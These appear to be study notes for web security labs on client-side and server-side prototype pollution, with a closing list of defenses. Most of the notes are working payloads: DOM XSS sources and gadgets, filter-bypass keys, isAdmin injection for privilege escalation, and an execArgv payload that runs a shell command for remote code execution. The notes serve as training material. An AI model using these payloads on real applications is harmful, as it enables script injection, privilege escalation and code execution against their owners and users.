# Prototype Pollution

## Lab: DOM XSS via client-side prototype pollution

What is Data Scheme URL? `data:, alert(1)`  
How is the code triggered?   

Source: `/?__proto__.[transport_url]=alert(1)`
Gadget: 
```js
let script = document.createElement('script');
script.src = config.transport_url;
document.body.appendChild(script);
```

## Lab: DOM XSS via an alternative prototype pollution vector

Source: `/?__proto__.sequence=alert(1)==`

Gadget: `eval('if(alert(1)==1){ console.log(1) }');`


## Prototype pollution via the constructor

Source: `?__pro__proto__to__[transport_url]=data:%20,alert(1)`


## Lab: Client-side prototype pollution in third-party libraries
Use "DOM Invader".

## Lab: Client-side prototype pollution via browser APIs
```js
a = {}
a.__proto__.value = 123
b = {c: false}
Object.defineProperty(b, 'c', {configurable: false, writable: false});
b.c
```

what is b.c? why?  
Tip:
```js
a = {value: 123}
b = {}
Object.defineProperty(b, 'c', a)
b.c // would be 123
```


## Lab: Privilege escalation via server-side prototype pollution
Add the following property in change-address request:  
```json
"__proto__": {
    "isAdmin": true
}
```


## Lab: Detecting server-side prototype pollution without polluted property reflection

"__proto__":{
    "content-type": "application/json; charset=utf-7"
}

Question: `what does this mean? "foo in UTF-7 is +AGYAbwBv-"`


## Lab: Bypassing flawed input filters for server-side prototype pollution

Defense: set `__proto__` is not permitted.

```js
"constructor": {
    "prototype": {
        "isAdmin":true
    }
}
```


## Lab: Remote code execution via server-side prototype pollution

```js
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
```


## Prototype Pollution Prevention
1. Sanitizing property keys
2. Preventing changes to prototype objects: `Object.freeze(Object.prototype)`
3. Preventing an object from inheriting properties: `let myObject = Object.create(null)`
4. Using safer alternatives where possible, e.g. `Set` and `Map`








